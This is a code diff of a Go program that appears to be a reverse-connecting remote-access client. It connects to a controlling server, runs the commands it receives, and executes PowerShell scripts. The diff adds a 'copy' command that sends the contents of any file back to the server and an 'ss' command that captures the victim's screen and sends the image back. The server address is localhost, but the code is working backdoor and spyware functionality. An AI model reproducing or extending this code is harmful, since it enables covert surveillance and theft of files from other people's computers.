@@ -3,12 +3,15 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"image/png"
 	"log"
 	"net"
 	"os"
 	"os/exec"
 	"strings"
 	"time"
+
+	"github.com/kbinani/screenshot"
 )
 
 var addr string = "localhost:8888"
@@ -29,9 +32,6 @@ func main() {
 		conn = nil
 		for conn == nil {
 			conn = dialServer(addr)
-			if conn == nil {
-				time.Sleep(5 * time.Second)
-			}
 		}
 		fmt.Printf("Host: %v\n", conn.LocalAddr().String())
 		handleServer(conn)
@@ -42,6 +42,7 @@ func dialServer(addr string) (conn net.Conn) {
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		fmt.Printf("Dail error: %v\n", err)
+		time.Sleep(5 * time.Second)
 		return nil
 	}
 
@@ -136,7 +137,7 @@ func runCommand(cmd string) (output string) {
 		if err != nil {
 			return err.Error()
 		}
-		
+
 		return fmt.Sprintf("Created %v successfully.", args)
 
 	case "write":
@@ -183,12 +184,12 @@ func runCommand(cmd string) (output string) {
 			return err.Error()
 		}
 
-		stdout, err := exec.Command("powershell.exe", ".\\"+filename).Output()
+		_, err = exec.Command("powershell.exe", ".\\"+filename).Output()
 		if err != nil {
 			return err.Error()
 		}
 
-		return fmt.Sprintf("Displayed %s from %v successfully.", stdout, filename)
+		return fmt.Sprintf("Displayed %v from %v successfully.", content, filename)
 
 	case "remove":
 		err := os.Remove(args)
@@ -197,8 +198,61 @@ func runCommand(cmd string) (output string) {
 		}
 		return fmt.Sprintf("Removed %v successfully", args)
 
+	case "copy":
+		data, err := os.ReadFile(args)
+		if err != nil {
+			return err.Error()
+		}
+		return string(data)
+
+	case "ss":
+		img, err := screenshot.CaptureDisplay(0)
+		if err != nil {
+			return err.Error()
+		}
+
+		file, err := os.Create("ss")
+		if err != nil {
+			return err.Error()
+		}
+
+		err = png.Encode(file, img)
+		if err != nil {
+			return err.Error()
+		}
+
+		err = file.Close()
+		if err != nil {
+			return err.Error()
+		}
+
+		file, err = os.Open("ss")
+		if err != nil {
+			return err.Error()
+		}
+
+		var imgBytes []byte
+		imgBytes = make([]byte, 67108864)
+		_, err = file.Read(imgBytes)
+		if err != nil {
+			return err.Error()
+		}
+		fmt.Println(len(imgBytes))
+
+		err = file.Close()
+		if err != nil {
+			return err.Error()
+		}
+
+		err = os.Remove(file.Name())
+		if err != nil {
+			return err.Error()
+		}
+
+		return string(imgBytes)
+
 	default:
-		return fmt.Sprintf("%v is not a valid command\n", cleanCmd)
+		return fmt.Sprintf("%v is not a valid command.", cleanCmd)
 	}
 }
 
